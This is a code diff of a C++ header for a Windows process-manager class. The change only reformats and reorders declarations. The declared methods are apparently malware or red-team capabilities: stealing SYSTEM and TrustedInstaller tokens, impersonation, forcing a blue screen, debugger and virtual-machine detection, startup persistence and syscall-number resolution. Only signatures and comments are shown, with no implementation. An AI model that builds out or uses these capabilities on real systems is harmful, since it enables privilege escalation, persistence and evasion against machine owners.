@@ -19,11 +19,9 @@ inline bool    DllsLoaded  = false;
 
 template <typename fp>
 struct FunctionPointer {
-    fp            call;
+    fp          call;
     std::string name;
     HMODULE     from;
-
-    FunctionPointer() = default;
 };
 
 enum class SecurityContext {
@@ -38,31 +36,33 @@ class ProcessManager {
 public:
     ProcessManager();
 
-    HMODULE            GetLoadedLib(std::string libName);            // Return a handle of an already loaded dll from 'loadedDlls'
-    BOOL               FreeUsedLibrary(std::string lib);             // Free a loaded library 'lib'
-
+    inline const SecurityContext GetProcessSecurityContext() const { return this->m_Context; }
+    HMODULE            GetLoadedLib(const std::string& libName);                    // Return a handle of an already loaded dll from 'loadedDlls'
+    BOOL               FreeUsedLibrary(const std::string& lib);                     // Free a loaded library 'lib'
     static void        ShutdownSystem(SHUTDOWN_ACTION type);
-    DWORD              PIDFromName(const char* name);                // Get the process ID from a process name.
-    HANDLE             ImpersonateWithToken(HANDLE token);           // Impersonate security context of 'token' for this thread
+    DWORD              PIDFromName(const char* name);                               // Get the process ID from a process name.
+    HANDLE             ImpersonateWithToken(HANDLE token);                          // Impersonate security context of 'token' for this thread
     HANDLE             CreateProcessAccessToken(DWORD processID, bool ti=false);    // Duplicate a process security token from the process id
-    DWORD              StartWindowsService(std::string serviceName); // Start a Windows service 'serviceName'—return process id.
-    HANDLE             GetSystemToken();                             // Get a SYSTEM permissions security token from winlogon.exe.
-    HANDLE             GetTrustedInstallerToken();                   // Obtain a Trusted Installer security token.
-    static bool        BeingDebugged();                            // Check if the current process is being debugged by looking at PEB
-    void               BSOD();                                       // Cause a blue screen of death on the current machine
-
-    // Wrapper that uses function pointer for CreateProcessWithTokenW
-    BOOL OpenProcessAsImposter(
-        HANDLE       token,
-        DWORD        dwLogonFlags,
-        LPCWSTR      lpApplicationName,
-        LPWSTR       lpCommandLine,
-        DWORD        dwCreationFlags,
-        LPVOID       lpEnvironment,
-        LPCWSTR      lpCurrentDirectory,
-        bool         saveOutput,
-        std::string& cmdOutput
-    );
+    DWORD              StartWindowsService(const std::string& serviceName);         // Start a Windows service 'serviceName'—return process id.
+    HANDLE             GetSystemToken();                                            // Get a SYSTEM permissions security token from winlogon.exe.
+    HANDLE             GetTrustedInstallerToken();                                  // Obtain a Trusted Installer security token.
+    static bool        BeingDebugged();                                             // Check if the current process is being debugged by looking at PEB
+    void               BSOD();                                                      // Cause a blue screen of death on the current machine
+    inline HANDLE      GetToken() const { return this->m_ElevatedToken; }
+    static UINT        GetSSN(HMODULE lib, std::string functionName);
+    void               AddProcessToStartup(std::string path);
+    bool               RunningInVirtualMachine();
+    static void        GetAndInsertSSN(HMODULE lib, std::string functionName);
+    static FARPROC     GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
+    BOOL               OpenProcessAsImposter(HANDLE token, 
+                                             DWORD dwLogonFlags, 
+                                             LPCWSTR lpApplicationName, 
+                                             LPWSTR lpCommandLine, 
+                                             DWORD dwCreationFlags, 
+                                             LPVOID lpEnvironment, 
+                                             LPCWSTR lpCurrentDirectory, 
+                                             bool saveOutput, 
+                                             std::string& cmdOutput);
 
     template <typename fp>
     inline const FunctionPointer<fp> GetNative(char* name) {
@@ -73,7 +73,7 @@ public:
     }
 
     template <typename fpType>
-    static inline fpType GetFunctionAddress(HMODULE lib, std::string proc) {
+    static inline fpType GetFunctionAddress(HMODULE lib, const std::string& proc) {
         return reinterpret_cast< fpType >( GetFunctionAddressInternal(lib, proc) );
     }
     
@@ -82,13 +82,6 @@ public:
         return GetFunctionAddress<fpType>(lib, name)( std::forward<Args>(args)... );
     }
 
-    inline HANDLE GetToken() const { return this->m_ElevatedToken; }
-    static unsigned int GetSSN(HMODULE lib, std::string functionName);
-    void AddProcessToStartup(std::string path);
-    bool RunningInVirtualMachine();
-    static void GetAndInsertSSN(HMODULE lib, std::string functionName);
-    inline const SecurityContext GetProcessSecurityContext() const { return this->m_Context; }
-    static FARPROC GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
 private:
     inline static std::unordered_map<std::string, std::any> m_Natives; // native function pointers
     std::unordered_map<std::string, HMODULE> m_LoadedDLLs;
